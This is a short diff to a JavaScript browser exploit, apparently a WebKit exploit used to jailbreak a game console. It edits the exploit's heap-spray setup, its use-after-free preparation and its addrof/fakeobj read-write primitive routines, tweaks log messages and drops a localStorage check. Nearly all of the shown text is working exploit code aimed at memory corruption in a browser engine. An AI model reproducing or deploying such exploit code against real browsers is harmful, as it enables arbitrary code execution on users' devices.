@@ -116,15 +116,14 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("Exploração do webkit concluída! Inciando a exploração do kernel, AGUARDE...");
+	debug_log("[+] Succesfully got addrof/fakeobj");
+	debug_log("A G U A R D E ! ! !");
 
 	/* Getting code execution */
 	/* ... */
 	if(window.postExploit)
 		window.postExploit();
-
 }
-
 
 function read(addr, length) {
 	for (let i = 0; i < 8; i++)
@@ -415,6 +414,9 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
+	debug_log("");
+	debug_log("");
+	debug_log("");
 	debug_log("[+] Spraying HTMLTextareaElement ...");
 
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
@@ -444,15 +446,13 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-		if(localStorage.is75XV2Cached){
-		/* Init spray */
-		sprayHTMLTextArea();
+	/* Init spray */
+	sprayHTMLTextArea();
 
-		if(window.midExploit)
-			window.midExploit();
+	if(window.midExploit)
+		window.midExploit();
 
-		g_input = input1;
-		/* Shape heap layout for obj. reuse */
-		prepareUAF();
-	}
+	g_input = input1;
+	/* Shape heap layout for obj. reuse */
+	prepareUAF();
 }
